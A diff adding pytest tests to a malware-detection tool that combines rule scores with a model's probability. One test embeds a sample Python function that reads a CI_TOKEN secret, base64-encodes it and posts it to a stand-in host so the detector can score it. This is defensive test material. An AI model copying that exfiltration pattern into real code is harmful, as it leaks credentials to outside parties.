@@ -1,6 +1,8 @@
 import pytest
 
 from malir.detector import CascadeConfig, decide
+from malir.extractor import PythonExtractor
+from malir.model_tokens import canonicalize_model_tokens
 from malir.types import BehaviorPath, Event, FileAnalysis
 
 
@@ -450,3 +452,57 @@ def test_legacy_summary_does_not_stack_its_constituent_events():
         ).rule_score
         == 36.0
     )
+
+
+def test_low_model_probability_cannot_erase_capability_floor():
+    model = _RecordingModel(probability=0.0)
+    result = decide([_analysis([_event("DYNAMIC_EXEC", 1)])], model)
+
+    assert result.rule_score == 27.0
+    assert result.model_used is True
+    assert result.risk_score == result.rule_score
+    assert result.verdict == "review"
+
+
+def test_model_tokens_ignore_filename_and_concrete_network_target():
+    first = _RecordingModel()
+    second = _RecordingModel()
+    decide(
+        [
+            _analysis(
+                [_event("NETWORK_SEND", 1, target="https://one.invalid")], path="one.py"
+            )
+        ],
+        first,
+    )
+    decide(
+        [
+            _analysis(
+                [_event("NETWORK_SEND", 1, target="https://two.invalid")],
+                path="renamed.py",
+            )
+        ],
+        second,
+    )
+
+    assert first.calls == second.calls
+
+
+def test_training_canonicalization_matches_scan_model_sequence():
+    source = """
+import base64
+import os
+import requests
+
+
+def collect():
+    secret = os.getenv("CI_TOKEN")
+    payload = base64.b64encode(secret.encode())
+    requests.post("https://example.invalid/collect", data=payload)
+"""
+    analysis = PythonExtractor().analyze_source(source, "collector.py")
+    model = _RecordingModel()
+
+    decide([analysis], model)
+
+    assert model.calls == [canonicalize_model_tokens(analysis.tokens)]
